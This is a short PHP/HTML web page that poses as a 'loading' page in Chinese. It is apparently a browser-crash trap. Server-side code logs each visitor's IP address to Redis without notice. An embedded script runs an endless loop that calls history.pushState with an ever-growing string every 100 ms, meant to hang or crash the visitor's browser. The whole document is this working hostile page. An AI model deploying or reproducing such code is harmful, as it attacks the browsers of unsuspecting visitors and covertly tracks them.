<?php include_once( "boomb_functions.php" );?>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>加载中...</title>
    <?php
        $ip = jinyu121_boomb_get_ip();
        if ($ip != 'Unknow_IP'){
            //jinyu121_boomb_log_ip_to_file($ip);
            jinyu121_boomb_log_ip_to_redis($ip);
        }
    ?>
</head>
<body>
    <script>
        setInterval(function (){
        	var total="";
        	for (var i=0;true;i++)
        	{
        		total= total+i.toString ();
        		history.pushState (0,0,total);
        	}
        },100);
    </script>
    <h1>网页加载中...</h1>
</body>
</html>
